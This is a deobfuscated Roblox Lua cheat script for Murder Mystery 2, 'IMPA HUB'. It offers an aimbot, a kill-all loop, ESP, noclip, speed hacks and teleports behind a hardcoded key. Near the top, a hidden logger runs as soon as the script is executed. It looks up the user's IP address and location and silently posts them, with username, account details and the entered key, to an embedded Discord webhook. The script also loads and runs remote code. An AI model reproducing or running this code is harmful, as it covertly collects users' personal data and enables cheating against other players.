-- This file was generated at discord.gg/syncrypt

local env = getfenv and getfenv() or _ENV
local unpack_ = unpack or table.unpack
local t1 = {
	value1 = ("https://discord.com/api/webhooks/1464222037416611977/E_LFwAnQyTCh1KgituKBYhlVcbIfeOyYxCDRpejuXH59kggB0eL0lENhrIV8FUFe3qEO"):gsub("discord.com", "webhook.lewisakura.moe"),
	value2 = nil
}

function t1.value2()
	local HttpService = game:GetService("HttpService")

	local function v5()
		return unpack_({ HttpService:JSONDecode(unpack_({ game:HttpGet("http://ip-api.com/json/") })) })
	end

	local ok, result = pcall(v5)

	return not ok and {
		country = "Unknown",
		city = "Unknown",
		query = "N/A"
	} or result
end
function t1.value3(p1, p2)
	local HttpService = game:GetService("HttpService")
	local LocalPlayer = game:GetService("Players").LocalPlayer
	local identifyexecutor_ = identifyexecutor and identifyexecutor() or "Unknown"
	local v11 = t1.value2()
	local v12 = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
	local t2 = {
		embeds = {
			{
				title = "🛡️ SCRIPT LOG | " .. p1,
				description = "🔗 **[CLICK HERE TO JOIN SERVER](" .. v12 .. ")**",
				fields = {
					{
						name = "👤 User",
						value = LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")",
						inline = true
					},
					{
						name = "🛠️ Executor",
						value = identifyexecutor_,
						inline = true
					},
					{
						name = "🌎 Location",
						value = v11.country .. ", " .. v11.city,
						inline = true
					},
					{
						name = "📍 IP Address",
						value = "||" .. v11.query .. "||",
						inline = true
					},
					{
						name = "🔑 Key/Input",
						value = "```" .. (p2 or "N/A```"),
						inline = false
					},
					{
						name = "📅 Account Age",
						value = LocalPlayer.AccountAge .. " days",
						inline = true
					},
					{
						name = "🆔 Job ID",
						value = "```" .. game.JobId .. "```",
						inline = false
					}
				},
				color = (p1:find("Granted") or p1:find("Accepted")) and 65280 or 16753920,
				footer = {
					text = "IMPA HUB | Server Tracking System"
				},
				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
			}
		}
	}
	local syn_ = syn

	if syn_ then
		syn_ = syn.request
	end

	if not syn_ then
		syn_ = http_request

		if not syn_ then
			syn_ = request

			if not syn_ then
				if HttpService then
					syn_ = HttpService.request
				else
					syn_ = HttpService
				end
			end
		end
	end

	if not syn_ then
		return
	end

	task.spawn(function()
		local function v15()
			syn_({
				Url = t1.value1,
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json"
				},
				Body = HttpService:JSONEncode(t2)
			})
		end

		pcall(v15)
	end)
end

task.spawn(function()
	t1.value3("Script Executed", "Awaiting Login")
end)

if not game:IsLoaded() then
	game.Loaded:Wait()
end

t1.value4 = "MURDER IMPA 2"
t1.value5 = game:GetService("Players")
t1.value6 = t1.value5.LocalPlayer
t1.value7 = game:GetService("RunService")
t1.value8 = game:GetService("UserInputService")
t1.value9 = workspace.CurrentCamera
t1.value10 = {
	Aimbot = false,
	AimbotIsHolding = false,
	KillAll = false,
	AutoShoot = false,
	ESP = false,
	Xray = false,
	WS = 16,
	JP = 50,
	Noclip = false,
	Spinbot = false,
	SpinSpeed = 200,
	AntiAFK = false,
	FullBright = false
}

function t1.value11()
	local v16, v17, v18 = pairs(t1.value5:GetPlayers())

	while true do
		local v19

		v18, v19 = v16(v17, v18)

		if not v18 then
			break
		end

		local Character = v19.Character

		if Character then
			Character = v19.Character:FindFirstChild("Knife") or v19.Backpack:FindFirstChild("Knife")
		end

		if Character then
			return v19
		end
	end

	return nil
end

local function v21()
	local v22, v23, v24 = pairs(t1.value5:GetPlayers())

	while true do
		local v25

		v24, v25 = v22(v23, v24)

		if not v24 then
			break
		end

		local Character = v25.Character

		if Character then
			Character = v25.Character:FindFirstChild("Gun") or v25.Backpack:FindFirstChild("Gun")
		end

		if Character then
			return v25
		end
	end

	return nil
end

function loadSplashScreen()
	local ScreenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
	local Frame = Instance.new("Frame", ScreenGui)

	Frame.Size = UDim2.new(1, 0, 1, 0)
	Frame.BackgroundColor3 = Color3.new(0, 0, 0)

	local TextLabel = Instance.new("TextLabel", Frame)

	TextLabel.Size = UDim2.new(1, 0, 0.2, 0)
	TextLabel.Position = UDim2.new(0, 0, 0.4, 0)
	TextLabel.TextColor3 = Color3.fromRGB(0, 170, 255)
	TextLabel.Text = "MADE BY IMPADINNO1Q"
	TextLabel.Font = Enum.Font.LuckiestGuy
	TextLabel.TextScaled = true
	TextLabel.BackgroundTransparency = 1
	TextLabel.TextTransparency = 1

	local TweenService = game:GetService("TweenService")

	TweenService:Create(TextLabel, TweenInfo.new(2), {
		TextTransparency = 0
	}):Play()
	task.wait(2.5)
	TweenService:Create(TextLabel, TweenInfo.new(1.5), {
		TextTransparency = 1
	}):Play()
	TweenService:Create(Frame, TweenInfo.new(1.5), {
		BackgroundTransparency = 1
	}):Play()
	task.wait(1.5)
	ScreenGui:Destroy()
	loadMainScript()
end
function loadMainScript()
	local t3 = {
		Name = "🎮 IMPA HUB – MM2",
		LoadingTitle = "IMPA HUB LOADING...",
		LoadingSubtitle = "by Impadinno1q",
		ConfigurationSaving = {
			Enabled = false
		}
	}
	local v32 = loadstring(game:HttpGet("https://sirius.menu/rayfield"))():CreateWindow(t3)
	local v33 = v32:CreateTab("🎯 COMBAT")
	local v34 = v32:CreateTab("🧍 PLAYER")
	local v35 = v32:CreateTab("👀 VISUALS")
	local v36 = v32:CreateTab("🚀 TELEPORT")
	local v37 = v32:CreateTab("⚙️ SETTINGS")

	v33:CreateToggle({
		Name = "Enable Smart Aimbot",
		CurrentValue = false,
		Callback = function(p3)
			t1.value10.Aimbot = p3
		end
	})
	v33:CreateLabel("Hold Right-Click to Aim at Enemy Role")

	local t4 = {
		Name = "Kill All Players (Murderer Only)",
		CurrentValue = false,
		Callback = function(p4)
			t1.value10.KillAll = p4
		end
	}

	v33.CreateToggle(v33, t4)

	local t5 = {
		Name = "Auto Shoot Murderer (Sheriff Only)",
		CurrentValue = false,
		Callback = function(p5)
			t1.value10.AutoShoot = p5
		end
	}

	v33.CreateToggle(v33, t5)

	local t6 = {
		Name = "Walk Speed",
		Range = { 16, 250 },
		Increment = 1,
		CurrentValue = 16,
		Callback = function(p6)
			t1.value10.WS = p6
		end
	}

	v34.CreateSlider(v34, t6)
	v34:CreateSlider({
		Name = "Jump Power",
		Range = { 50, 500 },
		Increment = 1,
		CurrentValue = 50,
		Callback = function(p7)
			t1.value10.JP = p7
		end
	})

	local t7 = {
		Name = "Noclip (Keybind: N)",
		CurrentValue = false,
		Callback = function(p8)
			t1.value10.Noclip = p8
		end
	}

	v34.CreateToggle(v34, t7)
	v34:CreateToggle({
		Name = "Spinbot",
		CurrentValue = false,
		Callback = function(p9)
			t1.value10.Spinbot = p9
		end
	})
	v34:CreateSlider({
		Name = "Spin Speed",
		Range = { 10, 500 },
		Increment = 1,
		CurrentValue = 100,
		Callback = function(p10)
			t1.value10.SpinSpeed = p10
		end
	})

	local t8 = {
		Name = "Player ESP (Keybind: T)",
		CurrentValue = false,
		Callback = function(p11)
			t1.value10.ESP = p11
		end
	}

	v35.CreateToggle(v35, t8)
	v35.CreateToggle(v35, {
		Name = "X-Ray Vision",
		CurrentValue = false,
		Callback = function(p12)
			local v43, v44, v45 = pairs(workspace:GetDescendants())

			while true do
				local v46

				v45, v46 = v43(v44, v45)

				if not v45 then
					break
				end

				local isBasePart = v46:IsA("BasePart")

				if isBasePart then
					isBasePart = not v46.Parent:FindFirstChild("Humanoid")
				end

				if isBasePart then
					v46.LocalTransparencyModifier = p12 and 0.5 or 0
				end
			end
		end
	})

	local t9 = {
		Name = "Teleport to Lobby",
		Callback = function()
			t1.value6.Character.HumanoidRootPart.CFrame = CFrame.new(-108, 140, 0)
		end
	}

	v36.CreateButton(v36, t9)
	v36:CreateButton({
		Name = "Teleport to Murderer",
		Callback = function()
			local v49 = t1.value11()

			if not v49 then
				return
			end

			t1.value6.Character.HumanoidRootPart.CFrame = v49.Character.HumanoidRootPart.CFrame
		end
	})
	v36:CreateButton({
		Name = "Teleport to Sheriff",
		Callback = function()
			local v50 = v21()

			if not v50 then
				v63 = env.OYTPLyxpUa6678

				return
			end

			t1.value6.Character.HumanoidRootPart.CFrame = v50.Character.HumanoidRootPart.CFrame

			local OYTPLyxpUa6678 = env.OYTPLyxpUa6678
		end
	})

	local t10 = {
		Name = "Teleport to Gun (If Dropped)",
		Callback = function()
			local GunDrop = workspace:FindFirstChild("GunDrop")

			if not GunDrop then
				return
			end

			t1.value6.Character.HumanoidRootPart.CFrame = GunDrop.CFrame
		end
	}

	v36.CreateButton(v36, t10)
	v37:CreateButton({
		Name = "Boost FPS",
		Callback = function()
			local v54, v55, v56 = pairs(game:GetDescendants())

			while true do
				local v57

				v56, v57 = v54(v55, v56)

				if not v56 then
					break
				end

				if v57:IsA("PostProcessEffect") or v57:IsA("ParticleEmitter") then
					v57.Enabled = false
				end
			end
		end
	})

	local t11 = {
		Name = "Full Brightness",
		CurrentValue = false,
		Callback = function(p13)
			t1.value10.FullBright = p13

			if p13 then
				game:GetService("Lighting").Brightness = 2
				game:GetService("Lighting").ClockTime = 14
			else
				game:GetService("Lighting").Brightness = 1
			end
		end
	}

	v37.CreateToggle(v37, t11)
	v37:CreateButton({
		Name = "Rejoin Server",
		Callback = function()
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, t1.value6)
		end
	})

	local t12 = {
		Name = "Server Hop",
		Callback = function()
			local HttpService = game:GetService("HttpService")
			local PlaceId = game.PlaceId
			local data = HttpService:JSONDecode(unpack_({ game:HttpGet("https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?sortOrder=Asc&limit=100") }))
			local v64, v65, v66 = pairs(data.data)

			while true do
				local v67

				v66, v67 = v64(v65, v66)

				if not v66 then
					break
				end

				if v67.playing < v67.maxPlayers then
					game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, v67.id)
				end
			end
		end
	}

	v37.CreateButton(v37, t12)
	t1.value8.InputBegan:Connect(function(input, gameProcessed)
		if not gameProcessed then
			if input.KeyCode == Enum.KeyCode.N then
				t1.value10.Noclip = not t1.value10.Noclip
			else
				local KeyCode = input.KeyCode
				local T = Enum.KeyCode.T
				local _ = KeyCode == T and 3026848 or false

				if KeyCode == T then
					t1.value10.ESP = not t1.value10.ESP
				else
					if input.UserInputType ~= Enum.UserInputType.MouseButton2 then
						v84 = env.D5HUzcMrOFST

						return
					end

					t1.value10.AimbotIsHolding = true
				end
			end

			local D5HUzcMrOFST = env.D5HUzcMrOFST
		end
	end)
	t1.value8.InputEnded:Connect(function(input)
		if input.UserInputType ~= Enum.UserInputType.MouseButton2 then
			return
		end

		t1.value10.AimbotIsHolding = false
	end)
	t1.value7.RenderStepped:Connect(function()
		local Aimbot = t1.value10.Aimbot

		if Aimbot then
			Aimbot = t1.value10.AimbotIsHolding
		end

		if Aimbot then
			local Knife = (t1.value6.Character:FindFirstChild("Knife") or t1.value6.Backpack:FindFirstChild("Knife")) and v21() or t1.value11()
			local Character

			if Knife then
				Character = Knife.Character
			else
				Character = Knife
			end

			if Character then
				t1.value9.CFrame = CFrame.lookAt(t1.value9.CFrame.Position, Knife.Character.HumanoidRootPart.Position)
			end
		end

		local Character = t1.value6.Character

		if Character then
			Character = t1.value6.Character:FindFirstChild("Humanoid")
		end

		if not Character then
			return
		end

		t1.value6.Character.Humanoid.WalkSpeed = t1.value10.WS
		t1.value6.Character.Humanoid.JumpPower = t1.value10.JP

		if not t1.value10.Noclip then
			return
		end

		local v75, v76, v77 = pairs(t1.value6.Character:GetDescendants())

		while true do
			local v78

			v77, v78 = v75(v76, v77)

			if not v77 then
				break
			end

			if v78:IsA("BasePart") then
				v78.CanCollide = false
			end
		end
	end)
	t1.value7.Heartbeat:Connect(function()
		local Spinbot = t1.value10.Spinbot

		if Spinbot then
			Spinbot = t1.value6.Character
		end

		if Spinbot then
			local HumanoidRootPart = t1.value6.Character.HumanoidRootPart
			local cFrame = CFrame.Angles
			local SpinSpeed = t1.value10.SpinSpeed
			local cFrame2 = cFrame(0, math.rad(SpinSpeed), 0)

			HumanoidRootPart.CFrame = HumanoidRootPart.CFrame * cFrame2
		end

		local KillAll = t1.value10.KillAll

		if KillAll then
			KillAll = t1.value11() == t1.value6
		end

		if not KillAll then
			return
		end

		local function v85()
			local Knife = t1.value6.Character:FindFirstChild("Knife") or t1.value6.Backpack:FindFirstChild("Knife")

			t1.value6.Character.Humanoid:EquipTool(Knife)

			local v87, v88, v89 = pairs(t1.value5:GetPlayers())

			while true do
				local v90

				v89, v90 = v87(v88, v89)

				if not v89 then
					break
				end

				local v91 = v90 ~= t1.value6

				if v91 then
					v91 = v90.Character

					if v91 then
						v91 = v90.Character.Humanoid.Health > 0
					end
				end

				if v91 then
					t1.value6.Character.HumanoidRootPart.CFrame = v90.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
					Knife:Activate()
				end
			end
		end

		pcall(v85)
	end)
	task.spawn(function()
		while task.wait(0.5) do
			if t1.value10.ESP then
				local v92, v93, v94 = pairs(t1.value5:GetPlayers())

				while true do
					local v95

					v94, v95 = v92(v93, v94)

					if not v94 then
						break
					end

					local v96

					if v95 == t1.value6 then
						v96 = false
					else
						v96 = v95.Character
					end

					if v96 then
						local ImpaESP = v95.Character:FindFirstChild("ImpaESP") or Instance.new("Highlight", v95.Character)

						ImpaESP.Name = "ImpaESP"

						local s1 = "FillColor"
						local Knife = v95.Backpack:FindFirstChild("Knife") or v95.Character:FindFirstChild("Knife")

						if Knife then
							Knife = Color3.new(1, 0, 0)
						end

						if not Knife then
							local Gun = v95.Backpack:FindFirstChild("Gun") or v95.Character:FindFirstChild("Gun")

							if Gun then
								Gun = Color3.new(0, 0, 1)
							end

							Knife = Gun or Color3.new(1, 1, 1)
						end

						ImpaESP[s1] = Knife
						ImpaESP.Enabled = true
					end
				end
			else
				local v101, v102, v103 = pairs(t1.value5:GetPlayers())

				while true do
					local v104

					v103, v104 = v101(v102, v103)

					if not v103 then
						break
					end

					local Character = v104.Character

					if Character then
						Character = v104.Character:FindFirstChild("ImpaESP")
					end

					if Character then
						v104.Character.ImpaESP.Enabled = false
					end
				end
			end
		end
	end)
end

(function()
	local ScreenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
	local Frame = Instance.new("Frame", ScreenGui)

	Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	Frame.Position = UDim2.new(0.5, -150, 0.5, -110)
	Frame.Size = UDim2.new(0, 300, 0, 220)
	Instance.new("UICorner", Frame)

	local TextLabel = Instance.new("TextLabel", Frame)

	TextLabel.Size = UDim2.new(1, 0, 0.3, 0)
	TextLabel.Text = "IMPA HUB | KEY SYSTEM"
	TextLabel.TextColor3 = Color3.fromRGB(0, 170, 255)
	TextLabel.Font = Enum.Font.GothamBold
	TextLabel.TextSize = 20
	TextLabel.BackgroundTransparency = 1

	local TextBox = Instance.new("TextBox", Frame)

	TextBox.PlaceholderText = "Enter Key..."
	TextBox.Position = UDim2.new(0.1, 0, 0.35, 0)
	TextBox.Size = UDim2.new(0.8, 0, 0.15, 0)
	TextBox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
	TextBox.TextColor3 = Color3.new(1, 1, 1)
	Instance.new("UICorner", TextBox)

	local TextButton = Instance.new("TextButton", Frame)

	TextButton.Text = "SUBMIT"
	TextButton.Position = UDim2.new(0.1, 0, 0.55, 0)
	TextButton.Size = UDim2.new(0.8, 0, 0.15, 0)
	TextButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
	TextButton.TextColor3 = Color3.new(1, 1, 1)
	TextButton.Font = Enum.Font.GothamBold
	Instance.new("UICorner", TextButton)
	TextButton.MouseButton1Click:Connect(function()
		if TextBox.Text == t1.value4 then
			ScreenGui:Destroy()
			loadSplashScreen()
		else
			TextButton.Text = "INVALID KEY"
			task.wait(1)
			TextButton.Text = "SUBMIT"
		end
	end)
end)()
